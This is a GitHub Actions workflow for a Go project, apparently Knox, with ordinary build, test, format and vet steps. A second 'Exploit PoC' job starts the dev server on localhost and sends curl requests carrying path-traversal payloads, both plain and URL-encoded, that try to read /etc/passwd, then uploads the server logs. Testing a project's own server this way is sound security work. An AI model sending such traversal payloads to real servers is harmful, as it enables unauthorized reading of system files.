name: Go

permissions: read-all

on:
  push:
    branches: [ master ]
  pull_request:
    branches: [ master ]

jobs:
  build:
    name: Build and Test
    runs-on: ubuntu-latest
    steps:
      - name: Set up Go 1.x
        uses: actions/setup-go@v2
        with:
          go-version: ^1.14.6

      - name: Checkout
        uses: actions/checkout@v2

      - name: Build
        run: go build -v ./...

      - name: Test
        run: go test -v ./...

      - name: Fmt
        run: diff -u <(echo -n) <(gofmt -d -s .)

      - name: Vet
        run: go vet ./...

  exploit_poc:
    name: Exploit PoC
    runs-on: ubuntu-latest
    needs: build
    steps:
      - name: Checkout
        uses: actions/checkout@v2

      - name: Set up Go 1.x
        uses: actions/setup-go@v2
        with:
          go-version: ^1.24

      - name: Start Knox dev server in background
        run: |
          go run ./cmd/dev_server > knox_server.log 2>&1 &
          echo $! > server.pid
          sleep 10

      - name: Check if port 8080 is listening
        run: netstat -tulnp | grep 8080 || true

      - name: Run exploit curl commands
        run: |
          curl -v http://localhost:8080/normal/path || true
          curl -v http://localhost:8080/../../../etc/passwd || true
          curl -v http://localhost:8080/api/v1/keys/../../../../../etc/passwd || true
          curl -v "http://localhost:8080/%2e%2e/%2e%2e/%2e%2e/etc/passwd" || true

      - name: Sleep to flush logs
        run: sleep 2

      - name: Stop Knox server
        run: kill $(cat server.pid) || true

      - name: Show Knox server logs
        run: cat knox_server.log || echo "No logs found"

      - name: Upload Knox server logs as artifact
        uses: actions/upload-artifact@v3
        with:
          name: knox_server_logs
          path: knox_server.log
